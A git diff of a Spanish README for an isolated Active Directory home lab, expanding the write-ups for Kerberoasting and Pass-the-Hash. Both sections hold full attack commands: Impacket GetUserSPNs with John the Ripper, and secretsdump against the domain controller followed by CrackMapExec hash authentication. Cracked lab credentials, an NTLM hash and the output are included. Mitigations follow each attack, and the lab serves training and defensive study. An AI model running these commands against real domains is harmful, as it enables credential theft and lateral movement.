@@ -24,7 +24,7 @@ Montado íntegramente en local con VMware Workstation — entorno 100% aislado, 
 │  ┌──────────────────┐   ┌──────────────────────────┐ │
 │  │  WIN-PC01        │   │  WIN-PC02                │ │
 │  │  Windows 10      │   │  Windows 10              │ │
-│  │  192.168.100.101 │   │  192.168.100.102         │ │
+│  │  192.168.100.21  │   │  192.168.100.22          │ │
 │  │  (víctima 1)     │   │  (víctima 2)             │ │
 │  └──────────────────┘   └──────────────────────────┘ │
 └──────────────────────────────────────────────────────┘
@@ -33,9 +33,9 @@ Montado íntegramente en local con VMware Workstation — entorno 100% aislado, 
 | VM | OS | IP | RAM | Rol |
 |---|---|---|---|---|
 | WIN-DC01 | Windows Server 2022 | 192.168.100.10 | 3 GB | Domain Controller, DNS, DHCP |
-| WIN-PC01 | Windows 10 | 192.168.100.101 | 2 GB | Cliente unido al dominio |
-| WIN-PC02 | Windows 10 | 192.168.100.102 | 2 GB | Cliente unido al dominio |
-| Kali Linux | Kali Linux 2024.x | 192.168.100.50 | 2 GB | Máquina atacante |
+| WIN-PC01 | Windows 10 | 192.168.100.21 | 2.5 GB | Cliente unido al dominio |
+| WIN-PC02 | Windows 10 | 192.168.100.22 | 2.5 GB | Cliente unido al dominio |
+| Kali Linux | Kali Linux 2024.x | 192.168.100.50 | 4 GB | Máquina atacante |
  
 **Dominio:** `lab.local` · **NetBIOS:** `LAB` · **Red:** VMware Host-only (VMnet2)
  
@@ -46,7 +46,7 @@ Montado íntegramente en local con VMware Workstation — entorno 100% aislado, 
 - VMware Workstation 17+
 - ISO Windows Server 2022 Evaluation (descarga gratuita — Microsoft)
 - ISO Windows 10 Evaluation (descarga gratuita — Microsoft)
-- Kali Linux (descarga oficial — kali.org)
+- Kali Linux VM (descarga oficial — kali.org/get-kali → Virtual Machines)
 - 12 GB RAM disponibles en el host
  
 ---
@@ -220,6 +220,8 @@ Set-MpPreference -DisableRealtimeMonitoring $true
 #### Red — IP estática
  
 ```bash
+echo "nameserver 192.168.100.10" | sudo tee /etc/resolv.conf
+ 
 sudo nano /etc/network/interfaces
 ```
  
@@ -234,13 +236,6 @@ iface eth0 inet static
  
 ```bash
 sudo systemctl restart networking
-```
- 
-#### VMware Tools
- 
-```bash
-sudo apt install -y open-vm-tools-desktop
-sudo reboot
 ```
  
 #### Verificación de conectividad
@@ -263,80 +258,138 @@ nslookup lab.local 192.168.100.10
 ![nslookup lab.local](./docs/screenshots/fase3-03-nslookup.png)
 
 *Resolución DNS del dominio lab.local desde Kali*
-
+ 
 ---
  
 ## ⚔️ Ataques documentados
  
 | Técnica | Herramienta | Estado |
 |---|---|---|
+| Kerberoasting | Impacket GetUserSPNs + John the Ripper | ✅ Completado |
+| Pass-the-Hash | Impacket secretsdump + CrackMapExec | ✅ Completado |
 | Enumeración AD | BloodHound + bloodhound-python | 📋 Pendiente |
-| Kerberoasting | Impacket GetUserSPNs + hashcat | 📋 Pendiente |
-| Pass-the-Hash | CrackMapExec + Impacket | 📋 Pendiente |
 | AS-REP Roasting | Impacket GetNPUsers | 📋 Pendiente |
 | DCSync | Impacket secretsdump | 📋 Pendiente |
  
 ---
  
-### 🔍 Enumeración con BloodHound
+## 🎯 Kerberoasting
  
-> 📋 *Documentación pendiente — Fase 3*
+### ¿Qué es?
+ 
+Kerberoasting explota el protocolo Kerberos para obtener tickets de servicio (TGS) cifrados con la contraseña de cuentas que tienen un SPN registrado. Cualquier usuario del dominio puede solicitar estos tickets y crackerarlos offline sin generar alertas en el DC.
+ 
+### Requisitos
+ 
+- Un usuario válido del dominio (cualquiera)
+- Una cuenta de servicio con SPN registrado (`svc-sql` en este lab)
+ 
+### Ejecución
  
 ```bash
-# Recopilar datos del dominio desde Kali
-bloodhound-python -u jsmith -p 'Password1' -d lab.local -ns 192.168.100.10 -c all
+# Paso 1 — Solicitar tickets TGS de cuentas con SPN
+impacket-GetUserSPNs lab.local/jsmith:'Password1' \
+  -dc-ip 192.168.100.10 \
+  -request \
+  -outputfile kerberoast.hash
  
-# Iniciar Neo4j y BloodHound
-sudo neo4j start
-bloodhound
+# Paso 2 — Crackear el hash offline
+john --format=krb5tgs \
+  --wordlist=/usr/share/wordlists/rockyou.txt \
+  kerberoast.hash
 ```
+ 
+### Resultado
+ 
+```
+Contraseña crackeada → svc-sql : MYpassword123#
+```
+ 
+**Verificación:**
+ 
+![Kerberoasting hash obtenido](./docs/screenshots/fase4-04-kerberoasting-hash.png)
+
+*TGS de svc-sql obtenido con credenciales de usuario estándar*
+ 
+![Contraseña crackeada](./docs/screenshots/fase4-05-kerberoasting-cracked.png)
+
+*John the Ripper crackea MYpassword123# en segundos*
+ 
+### Mitigación
+ 
+- Contraseñas de más de 25 caracteres en todas las service accounts
+- Usar **Group Managed Service Accounts (gMSA)** — contraseñas rotadas automáticamente por el DC
+- Auditar regularmente cuentas con SPN: `Get-ADUser -Filter {ServicePrincipalName -ne "$null"}`
  
 ---
  
-### 🎯 Kerberoasting
+## 🔑 Pass-the-Hash
  
-> 📋 *Documentación pendiente — Fase 3*
+### ¿Qué es?
  
-```bash
-# Solicitar TGS de cuentas con SPN registrado
-impacket-GetUserSPNs lab.local/jsmith:'Password1' -dc-ip 192.168.100.10 -request -outputfile kerberoast.hash
+Pass-the-Hash (PtH) aprovecha que Windows autentica usuarios mediante su hash NTLM — no necesita la contraseña en texto claro. Si obtienes el hash de un usuario con privilegios, puedes autenticarte como él en cualquier máquina del dominio sin conocer su contraseña.
  
-# Crackear el hash
-hashcat -m 13100 kerberoast.hash /usr/share/wordlists/rockyou.txt
-```
+### Requisitos
  
----
+- Credenciales de un usuario con privilegios de administrador local en el DC
+- Acceso SMB al objetivo
  
-### 🔑 Pass-the-Hash
- 
-> 📋 *Documentación pendiente — Fase 3*
+### Ejecución
  
 ```bash
-# Extraer hash NTLM
+# Paso 1 — Extraer hashes NTLM del DC
 impacket-secretsdump lab.local/localadmin:'P@ssw0rd123!'@192.168.100.10
  
-# Autenticarse con el hash sin necesidad de contraseña
-crackmapexec smb 192.168.100.0/24 -u localadmin -H <NTLM_HASH>
+# Hash NTLM extraído de localadmin:
+# localadmin:1106:aad3b435b51404eeaad3b435b51404ee:7dfa0531d73101ca080c7379a9bff1c7:::
+ 
+# Paso 2 — Autenticarse con el hash sin necesidad de contraseña
+crackmapexec smb 192.168.100.0/24 \
+  -u localadmin \
+  -H 7dfa0531d73101ca080c7379a9bff1c7
 ```
+ 
+### Resultado
+ 
+```
+[+] lab.local\localadmin:7dfa0531d73101ca080c7379a9bff1c7 (Pwn3d!)
+```
+ 
+**Verificación:**
+ 
+![Secretsdump hashes](./docs/screenshots/fase4-07-ntlm-hashes.png)
+
+*Hashes NTLM de todos los usuarios del dominio extraídos*
+ 
+![Pass-the-Hash Pwn3d](./docs/screenshots/fase4-08-pass-the-hash.png)
+
+*Acceso como Domain Admin sin contraseña — Pwn3d!*
+ 
+### Mitigación
+ 
+- Deshabilitar NTLM donde sea posible y forzar Kerberos
+- Activar **Windows Defender Credential Guard**
+- Implementar **Protected Users Security Group** para cuentas privilegiadas
+- Principio de mínimo privilegio — no reutilizar contraseñas entre cuentas admin
  
 ---
  
-## 🛡️ Mitigaciones
+## 🛡️ Resumen de mitigaciones
  
 | Ataque | Mitigación |
 |---|---|
-| Kerberoasting | Contraseñas +25 caracteres en service accounts · Usar Group Managed Service Accounts (gMSA) |
-| Pass-the-Hash | Deshabilitar NTLM donde sea posible · Activar Windows Defender Credential Guard |
-| BloodHound / Enumeración | Principio de mínimo privilegio · Auditar ACLs del dominio regularmente |
+| Kerberoasting | Contraseñas +25 caracteres en service accounts · Usar gMSA |
+| Pass-the-Hash | Deshabilitar NTLM · Activar Credential Guard · Protected Users |
+| BloodHound / Enumeración | Principio de mínimo privilegio · Auditar ACLs del dominio |
 | AS-REP Roasting | Forzar pre-autenticación Kerberos en todos los usuarios |
-| DCSync | Restringir permisos de replicación de directorio (solo DCs reales) |
+| DCSync | Restringir permisos de replicación (solo DCs reales) |
  
 ---
  
 ## 📚 Referencias
  
 - [HackTricks — Active Directory Methodology](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology)
-- [BloodHound Documentation](https://bloodhound.readthedocs.io)
 - [Impacket — GitHub](https://github.com/fortra/impacket)
 - [PayloadsAllTheThings — AD Attacks](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md)
 - [TarlogicSecurity — Kerberos Cheatsheet](https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a)
+- [CrackMapExec Wiki](https://wiki.porchetta.industries)
